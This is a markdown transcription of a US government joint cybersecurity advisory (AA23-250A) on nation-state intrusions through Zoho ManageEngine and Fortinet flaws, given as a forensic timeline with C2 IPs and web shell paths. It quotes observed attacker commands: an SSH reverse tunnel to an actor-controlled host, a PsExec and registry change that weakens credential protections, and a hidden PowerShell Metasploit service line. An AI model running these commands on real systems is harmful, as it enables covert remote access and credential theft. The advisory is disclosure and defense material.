@@ -1,0 +1,221 @@
+# CISA/FBI/CNMF AA23-250A — Multiple Nation-State Threat Actors Exploit CVE-2022-47966 and CVE-2022-42475
+
+> - Publisher: CISA, FBI and USCYBERCOM Cyber National Mission Force (CNMF), Joint Cybersecurity Advisory, Product ID AA23-250A, September 7, 2023 (TLP:CLEAR)
+> - Download URL (FBI IC3 copy of the joint advisory): https://www.ic3.gov/CSA/2023/230907.pdf
+> - CISA web page (not fetched; returns 403 from the retrieval host): https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-250a
+> - PDF SHA-256: 1aece64a56d47f544737fd2cf41ad175cf78fdd79863e5a6cc9d6e345e980b44 (`source.pdf`, 22 pages)
+> - License: U.S. Government work, TLP:CLEAR
+> - Scope of this file: SUMMARY (p.1, main column; the "Actions to take today" sidebar and reporting box are omitted) and TECHNICAL DETAILS → Overview, APT Actor Activity, and Forensic Timeline Table 1 (pp.2–10), verbatim. Table 1 is a three-column table (Timestamp / Event / Description); here each row is written as "Timestamp — Event" followed by its Description. Table 2 (Observed Tools, pp.10–12), ATT&CK tables, detection and mitigations are in `source.pdf.txt`.
+> - Retrieved: 2026-11-16
+> - Wording: the source's own wording; only page furniture, the sidebar, table layout, line wrapping and line-break hyphenation were removed. Source typos are kept (for example "downloadFlile", "wwwrot").
+
+## SUMMARY
+
+The Cybersecurity and Infrastructure Security Agency (CISA), Federal Bureau of Investigation (FBI), and Cyber National Mission Force (CNMF) identified the presence of indicators of compromise (IOCs) at an Aeronautical Sector organization as early as January 2023. Analysts confirmed that nation-state advanced persistent threat (APT) actors exploited CVE-2022-47966 to gain unauthorized access to a public-facing application (Zoho ManageEngine ServiceDesk Plus), establish persistence, and move laterally through the network. This vulnerability allows for remote code execution on the ManageEngine application. Additional APT actors were also observed exploiting CVE-2022-42475 to establish presence on the organization’s firewall device.
+
+CISA and co-sealers are releasing this joint Cybersecurity Advisory (CSA) to provide network defenders with tactics, techniques, and procedures (TTPs), IOCs, and methods to detect and protect against similar exploitation.
+
+## TECHNICAL DETAILS
+
+Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 13. See Tables 3-13 for the APT actors’ activity mapped to MITRE ATT&CK tactics and techniques with corresponding mitigation and/or detection recommendations.
+
+### Overview
+
+By request of the impacted organization, CISA conducted an incident response engagement from February to April 2023. CISA and co-sealers assess that beginning as early as January 2023, multiple nation-state APT actors were present on the organization’s network via at least two initial access vectors:
+
+- Initial Access Vector 1: APT actors exploited CVE-2022-47966 to access the organization’s web server hosting the public-facing application, Zoho ManageEngine ServiceDesk Plus.
+- Initial Access Vector 2: APT actors exploited CVE-2022-42475 to access the organization’s firewall device.
+
+CISA and co-sealers identified an array of threat actor activity, to include overlapping TTPs across multiple APT actors. Per the activity conducted, APT actors often scan internet-facing devices for vulnerabilities that can be easily exploited. Firewall, virtual private networks (VPNs), and other edge network infrastructure continue to be of interest to malicious cyber actors. When targeted, they can be leveraged to expand targeted network access, serve as malicious infrastructure, or a mixture of both.
+
+### APT Actor Activity
+
+#### Initial Access Vector 1
+
+As early as January 2023, APT actors exploited CVE-2022-47966 [T1190] for initial access to the organization’s web server hosting the public-facing application, Zoho ManageEngine ServiceDesk Plus. CISA observed indications in log files that a connection to the known malicious IP address 192.142.226[.]153 was made as part of initial exploitation.
+
+Through exploitation of CVE-2022-47966, APT actors achieved root level access on the web server and created a local user account [T1136.001] named Azure with administrative privileges [T1068]. Actors were further able to download malware, enumerate the network, collect administrative user credentials, and move laterally through the organization’s network. CISA and co-sealers were unable to determine if proprietary information was accessed, altered, or exfiltrated. This was due to the organization not clearly defining where their data was centrally located and CISA having limited network sensor coverage.
+
+#### Initial Access Vector 2
+
+Additional APT actors exploited CVE-2022-42475 on the organization’s firewall device, which was indicated by multiple successful VPN connections from known-malicious IPs between February 1-16, 2023. It was identified that APT actors compromised and used disabled, legitimate administrative account credentials [T1078.003] from a previously hired contractor—of which the organization confirmed the user had been disabled prior to the observed activity.
+
+Analysis identified that a common behavior for these threat actors was to use disabled administrative account credentials and delete logs from several critical servers in the environment [T1070.001]. This prevented the ability to detect follow-on exploitation or data exfiltration. CISA and co-sealers were also unable to further track the activity due to the organization not having Network Address Translation (NAT) IP logging enabled.
+
+APT actors initiated multiple Transport Layer Security (TLS)-encrypted sessions [T1573.002] on Transmission Control Protocol (TCP) port 10443 [T1571], indicating successful exchanges of data transfer from the firewall device. APT actors were observed connecting to the device from the following actor-controlled C2 IP addresses:
+
+- 144.202.2[.]71
+- 207.246.105[.]240
+- 45.77.121[.]232
+- 47.90.240[.]218
+
+APT actors further leveraged legitimate credentials to move from the firewall to a web server, where multiple web shells were loaded—among other locations, such as the OWA server—into the following directories. Note: The following file paths to these web shells were received in coordination with a trusted third-party; however, the artifacts were not received for analysis.
+
+- c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\resource.aspx
+- c:\inetpub\wwwroot\uninet\css\font-awesome\css\discover.ashx
+- c:\inetpub\wwwroot\uninet\css\font-awesome\css\configlogin.ashx
+- c:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\15\template\layouts\approveinfo.aspx
+- c:\Program Files\Microsoft Office Web Apps\RootWebsite\infos.aspx
+- c:\Program Files\Microsoft Office Web Apps\RootWebsite\errorinfo.aspx
+- c:\Program Files\Microsoft Office Web Apps\RootWebsite\infos.ashx
+- c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\error.aspx
+- c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\infos.aspx
+- c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\info.aspx
+- c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\info-1.aspx
+- c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\new_list.aspx
+- c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\errorinfo.aspx
+- c:\Program Files\Microsoft Office Web Apps\RootWebsite\en-us\lgnbotr.ashx
+- c:\inetpub\passwordchange\0LECPNJYRH.aspx
+- c:\inetpub\passwordchange\9ehj.aspx
+- c:\inetpub\wwwroot\wss\VirtualDirectories\Portal80\_vti_pvt\servicesinfo.ashx
+- c:\inetpub\wwwroot\wss\VirtualDirectories\Portal80\_vti_pvt\services.aspx
+- c:\inetpub\redirectedSites\[REDACTED]\products\uns1fw.aspx
+- c:\inetpub\redirectedSites\[REDACTED]\products\uns1ew.aspx
+
+The following IP addresses were identified as associated with the loaded web shells:
+
+- 45.90.123[.]194
+- 154.6.91[.]26
+- 154.6.93[.]22
+- 154.6.93[.]5
+- 154.6.93[.]12
+- 154.6.93[.]32
+- 154.6.93[.]24
+- 184.170.241[.]27
+- 191.96.106[.]40
+- 102.129.145[.]232
+
+### Forensic Timeline of APT Actor Activity
+
+Tables 1 and 2 list the timeline of events discovered during the incident response, as well as tools used by the APT actors to conduct their operations, respectively. All timestamps are presented in Coordinated Universal Time (UTC).
+
+#### Table 1: Timeline of APT Actor Activity
+
+**2023-01-18 11:57:02 — Hello World User-Agent string observed in 44 total events. Uniform Resource Identifier (URI): /cgi-bin/downloadFlile[.]cgi**
+Hello World, the User-Agent string inside of the initiated HTTP request, was observed during communication between the organization’s web server and malicious command and control (C2) server IP 92.118.39[.]82 [T1071.001]. This string has been observed in open source as an initial step of the Mirai botnet to download malicious artifacts [T1583.005].[1]
+
+**2023-01-20 — Attempts made to export three files; associated with malicious IP 192.142.226[.]153.**
+APT actors attempted to export [TA0009], [TA0010] three files, which were analyzed and identified as Local Security Authority Subsystem Service (LSASS) dump files. These files were renamed with .zip and .gif extensions to evade detection [T1036.008]. Analysis confirmed the APT actors were unsuccessful at exfiltrating these files:
+- wo_view_bg.zip (09:06:37 UTC)
+- wo_view_bg1.gif (09:08:11 UTC)
+- wo_view_bg2.gif (09:19:43 UTC)
+
+Note: If local administrative access is achieved on a victim host, dumping LSASS credentials may allow for lateral movement across the environment. This behavior was identified during the engagement and is detailed throughout Table 1.
+
+**2023-01-20 16:51:05 — Successful web server exploitation via CVE-2022-47966.**
+Successful web server (Zoho ManageEngine ServiceDesk Plus) exploitation via CVE-2022-47966.
+
+**2023-01-21 06:46:42 — Azure local user account with administrative permissions created.**
+A local user account with administrative permissions, named Azure, was created on the server hosting ServiceDesk Plus.
+Note: Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.
+
+**2023-01-21 06:49:40 — LSASS dumped by Azure user.**
+The Azure user successfully accessed and dumped credentials stored in the process memory of LSASS for the Active Directory (AD) domain [T1003.001].
+
+**2023-01-21 06:50:59 — Mimikatz.exe downloaded via ConnectWise ScreenConnect.**
+The legitimate ConnectWise ScreenConnect client was utilized to connect to the ServiceDesk system, download mimikatz.exe, and execute malicious payloads to steal credentials [T1219], [T1588.002].
+Note: ConnectWise ScreenConnect was observed in multiple locations within the organization’s environment, but the organization confirmed that it was not authorized software. Analysis assessed APT actors downloaded the legitimate software for malicious, illegitimate use prior to the download of mimikatz.exe.
+
+**2023-01-21 07:34:32 — Bitmap.exe malware downloaded and designated to connect to C2 IP 179.60.147[.]4.**
+Azure user account downloaded bitmap.exe to the ServiceDesk system to execute an obfuscated, embedded malicious payload from its C2 server [T1027.009]. This malware is identified as a variant of Metasploit (Meterpreter). See MAR-10430311-1.v1 for additional details.
+
+**2023-01-21 08:46:23 — Mimikatz credential dump files created.**
+Two files (c:\windows\system32\fuu.txt, c:\windows\system32\jojo.txt) were created as means for Mimikatz to dump/write credentials to disk on the ServiceDesk system [T1003].
+
+**2023-01-21 09:25:58 — Legitimate files/applications nmap.exe and npcap.exe downloaded.**
+Azure user account downloaded nmap.exe [T1018] and npcap.exe [T1040] to continue network and credential information gathering efforts. Though legitimate applications, APT actors used these files for illegitimate, malicious purposes.
+Note: Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.
+
+**2023-01-21 13:56:14 — ssh2.zip downloaded by the Azure user account.**
+APT actors downloaded the file ssh2.zip via the Azure user account, which contained legitimate files that could have been leveraged for malicious purposes. When unzipped, the following files were extracted:
+- install-sshd.ps1 (script)
+- psexec.exe
+- sshd.exe
+- ssh.exe
+- ssh-sk-helper.exe
+- libcrypto.dll
+
+Note: CISA analyzed these files and did not identify the files as malicious. However; ssh.exe was downloaded to establish persistence on the ServiceDesk system via SSH [T1133] and is detailed in the scheduled task below.
+
+**2023-01-21 14:02:45 — Ngrok token created, renamed to ngrok.yml config file, and Remote Desktop Protocol (RDP) connection established.**
+Ngrok was used to establish an RDP connection [T1021.001]—another method of maintaining persistence on the ServiceDesk system. In this instance, Ngrok was used to establish a reverse proxy connection to the ServiceDesk system.
+At the time of analysis, the firewall access control lists (ACLs) allowed all outbound connections. Considering APT actors utilized an outbound proxy, the RDP session was successfully established as the connection was initiated from the ServiceDesk system.
+Note: RDP is a common feature in operating systems, which allows a user to log into an interactive session with a system desktop graphical user interface on a remote system.
+
+**2023-01-21 14:31:01 — SSH tools downloaded to establish reverse (remote) communication.**
+Three identified executables, which provide a command line interface with the compromised system, were observed in the following file system locations:
+- c:\windows\system32\ssh-shellhost.exe
+- c:\windows\system32\ssh-agent.exe
+- c:\windows\system32\ssh-add.exe
+
+While the files were not identified as malicious, they were loaded for malicious purposes.
+
+**2023-01-21 14:33:11 — license validf scheduled task created to communicate with malicious IP 104.238.234[.]145.**
+license validf scheduled task [T1036.004] was created to execute ssh.exe on a recurring basis on the ServiceDesk system [T1053.005]:
+
+```
+c:\Windows\System32\ssh.exe -N -f -R 12100 sst@104.238.234.145 -p 443 -o StrictHostKeyChecking=no
+```
+
+Analysis identified ssh.exe was used to establish a SSH reverse tunnel to the APT actors’ C2 with dynamic port forwarding [T1572]. This allowed the actors to send traffic from their C2 server into the environment and connect directly to other systems and resources.
+
+**2023-01-21 14:51:49 — PsExec executed on the ServiceDesk system.**
+Analysis identified evidence and execution of two files (PsExec.exe and psexec.exe) on the ServiceDesk system. These files were determined to be benign. APT actors utilized PsExec to create a scheduled task and force-store administrative credentials to the local machine.
+
+```
+psexec.exe -i -s C:\Windows\System32\mmc.exe /s C:\Windows\System32\taskschd.msc
+powershell New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" PropertyType DWORD -Force
+```
+
+Note: PsExec, a command line utility from Microsoft's Sysinternals Suite, is known to be used for lateral movement; evidence of lateral movement via PsExec has not been confirmed.
+
+**2023-01-21 14:55:02 — ProcDump created on the ServiceDesk system.**
+ProcDump was created within the c:\windows\system32\prc64.exe directory. This was later identified as a method for enumerating running processes/applications [T1057] and dumping LSASS credentials.
+
+**2023-01-24 15:07:18 — Apache Log4j exploit attempted against the ServiceDesk system.**
+APT actors attempted to exploit a known Apache Log4j vulnerability (CVE-2021-44228) in the ServiceDesk system but were unsuccessful. The two IPs and one domain associated with this exploitation attempt are:
+- 80.85.241[.]15
+- 68.177.56[.]38
+- main.cloudfronts[.]net
+
+**2023-01-25 00:17:33 — Mimikatz credential dump files created.**
+One file (c:\ManageEngine\ServiceDesk\bin\1.txt) was created as a method for Mimikatz to dump/write credentials to disk on the ServiceDesk system.
+Note: This is a different path and time associated with Mimikatz than listed above.
+
+**2023-01-29 — HTTP-GET requests sent to C2 IP 92.118.39[.]82.**
+The server hosting ServiceDesk was observed beaconing/sending HTTP-GET requests to a suspected APT-controlled C2 server, indicating malware was successfully implanted.
+
+**2023-02-02 05:51:08 — Resource.aspx web shell detected.**
+Using additionally compromised, legitimate administrative credentials, APT actors logged into the Outlook Web Application (OWA) server from the ServiceDesk system. The actors dropped an Active Server Pages Extended (ASPX) web shell in the following file system location, which was designed to execute remote JavaScript code [T1059.007] on the OWA server [T1505.003]:
+- c:\Program Files\Microsoft Office Web Apps\RootWebSite\en-us\resource.aspx
+
+Note: The administrative user’s credentials were obtained from the APT actors’ collection (LSASS dump) of credentials from the entire AD domain. This user is separate from the actor-created Azure user account. See MAR-10430311-1.v1 for additional details.
+
+**2023-02-02 18:45:58 — Metasploit service installed.**
+APT actors installed Metasploit with the following attributes on the organization’s domain controller [T1059.001]:
+- Service Name: QrrCvbrvnxasKTSb [T1543.003]
+- Service File Name: %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c &amp;quot;if([IntPtr]::Size -eq 4) [T1564.003]
+
+Note: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform several actions, including discovery of information and execution of code.
+
+**2023-02-03 03:27:59 — ConfigLogin.aspx web shell detected.**
+APT actors dropped an additional ASPX web shell on a web server in the following file system location:
+- c:\inetpub\wwwrot\uninet\css\font-awesome\css\ConfigLogin.aspx
+
+See MAR-10430311-1.v1 for additional details.
+
+**2023-02-03 15:12:23 — wkHPd.exe created to communicate with malicious IP 108.62.118[.]160.**
+APT actors created and used a variant of Metasploit (Meterpreter) on the ServiceDesk system, listed as wkHPd.exe [T1587.001]. This variant serves as an attack payload that runs an interactive shell and allows a malicious actor to control and execute code on a system. See MAR-10430311-1.v1 for additional details.
+
+**2023-02-08 08:56:35, 2023-02-09 20:19:59, 2023-03-04, 2023-03-18 — Hypertext Preprocessor (PHP) files uploaded via HTTP-POST request from malicious IP 193.142.146[.]226.**
+PHP files were uploaded to the ServiceDesk system via HTTP-POST request. APT actors were observed writing 16 instances of the following files to disk:
+- [REDACTED]/wp-content/themes/seotheme/db.php (12 instances)
+- [REDACTED]/wp-content/plugins/ioptimization/IOptimize.php (4 instances)
+
+**2023-03-06 06:49:40 — Interact.sh**
+APT actors executed Domain Name System (DNS) scanning at an additional server (not the ServiceDesk system) and directed callback to the Interact.sh domain, which indicated the server was susceptible to a DNS-style attack [T1046].
+Destination IP: 103.105.49[.]108
+
+Post-engagement analysis was extended but analysts were unable to determine additional actions taken by the APT actors, likely due to a lack of sensor coverage and data unavailability. With the data available, it was determined APT actors used the tools listed in Table 2 during their operations.
+
+[Table 2: Observed Tools Used by APT Actors (Mimikatz, Ngrok, ProcDump, Metasploit, Interact.sh, anydesk.exe, quser.exe, …) — see `source.pdf.txt`, pp.10–12.]
